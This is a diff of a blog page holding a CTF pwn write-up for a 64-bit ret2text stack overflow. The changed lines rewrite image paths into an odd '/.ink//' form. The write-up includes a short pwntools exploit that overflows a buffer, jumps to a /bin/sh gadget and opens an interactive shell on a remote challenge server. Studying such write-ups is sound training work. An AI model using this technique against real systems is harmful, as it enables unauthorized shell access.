@@ -76,11 +76,11 @@
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201012192733970.png#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201012194105578.png#pic_center">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20201012194138780.png#pic_center">
-<meta property="og:image" content="http://trick.ink/2021/03/30/CTFShow_0x1/Pwn_CTFShow_01/20201012194826370.png">
-<meta property="og:image" content="http://trick.ink/2021/03/30/CTFShow_0x1/Pwn_CTFShow_01/20201012194915979.png">
-<meta property="og:image" content="http://trick.ink/2021/03/30/CTFShow_0x1/Pwn_CTFShow_01/20201012195035341.png">
-<meta property="og:image" content="http://trick.ink/2021/03/30/CTFShow_0x1/Pwn_CTFShow_01/20201012195145849.png">
-<meta property="og:image" content="http://trick.ink/2021/03/30/CTFShow_0x1/Pwn_CTFShow_01/20201012195243513.png">
+<meta property="og:image" content="http://trick.ink/.ink//20201012194826370.png">
+<meta property="og:image" content="http://trick.ink/.ink//20201012194915979.png">
+<meta property="og:image" content="http://trick.ink/.ink//20201012195035341.png">
+<meta property="og:image" content="http://trick.ink/.ink//20201012195145849.png">
+<meta property="og:image" content="http://trick.ink/.ink//20201012195243513.png">
 <meta property="article:published_time" content="2021-03-30T04:41:21.935Z">
 <meta property="article:modified_time" content="2021-07-24T06:31:12.627Z">
 <meta property="article:author" content="Trick">
@@ -424,17 +424,17 @@
 
 
 <h2 id="8-栈溢出之ret2text"><a href="#8-栈溢出之ret2text" class="headerlink" title="8.栈溢出之ret2text"></a>8.栈溢出之ret2text</h2><h3 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text 64"></a>ret2text 64</h3><p>很简单的一个栈溢出<br>直接IDA分析</p>
-<p><img src="Pwn_CTFShow_01/20201012194826370.png" alt="在这里插入图片描述"></p>
+<p><img src="/.ink//20201012194826370.png" alt="在这里插入图片描述"></p>
 <p>从main函数跟进到welcome函数<br>get() 很明显的溢出</p>
-<p><img src="Pwn_CTFShow_01/20201012194915979.png" alt="在这里插入图片描述"></p>
+<p><img src="/.ink//20201012194915979.png" alt="在这里插入图片描述"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)</span><br></pre></td></tr></table></figure>
 
 <p>因为是64位的，所以后面要加上8<br>Shift+F12 </p>
-<p><img src="Pwn_CTFShow_01/20201012195035341.png" alt="在这里插入图片描述"></p>
+<p><img src="/.ink//20201012195035341.png" alt="在这里插入图片描述"></p>
 <p>发现/bin/sh 果然够简单的。。。<br>双击进去</p>
-<p><img src="Pwn_CTFShow_01/20201012195145849.png" alt="在这里插入图片描述"></p>
+<p><img src="/.ink//20201012195145849.png" alt="在这里插入图片描述"></p>
 <p>再双击</p>
-<p><img src="Pwn_CTFShow_01/20201012195243513.png" alt="在这里插入图片描述"></p>
+<p><img src="/.ink//20201012195243513.png" alt="在这里插入图片描述"></p>
 <p>找到地址<br>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.231.70.44&#x27;</span>,<span class="number">28072</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>) + p64(<span class="number">0x40063B</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
